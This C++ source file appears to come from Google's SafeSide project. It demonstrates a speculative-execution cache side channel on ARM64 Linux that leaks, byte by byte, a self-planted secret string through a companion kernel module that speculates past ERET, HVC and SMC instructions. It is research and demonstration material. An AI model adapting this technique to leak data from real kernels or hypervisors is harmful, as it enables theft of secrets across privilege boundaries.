/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <array>
#include <cstring>
#include <fstream>
#include <iostream>

#ifndef __linux__
#  error Unsupported OS. Linux required.
#endif

#ifndef __aarch64__
#  error Unsupported architecture. ARM64 required.
#endif

#include "cache_sidechannel.h"
#include "instr.h"

// Private data to be leaked.
const char *private_data = "It's a s3kr3t!!!";

// Userspace wrapper of the eret_hvc_smc kernel module.
// Writes userspace addresses into a SYSFS file while the kernel handler
// accesses those adresses speculatively after it speculates over ERET, HVC and
// SMC instructions.
static char leak_byte(size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    std::ofstream out("/sys/kernel/safeside_eret_hvc_smc/address");
    if (out.fail()) {
      std::cerr << "Eret_hvc_smc module not loaded or not running as root."
                << std::endl;
      exit(EXIT_FAILURE);
    }

    sidechannel.FlushOracle();

    // Sends the secret address in the oracle to the kernel so that it's
    // accessed only in there and only speculatively.
    out << std::hex << static_cast<const void *>(
        isolated_oracle.data() + static_cast<size_t>(private_data[offset]));
    out.close();

    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << leak_byte(i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
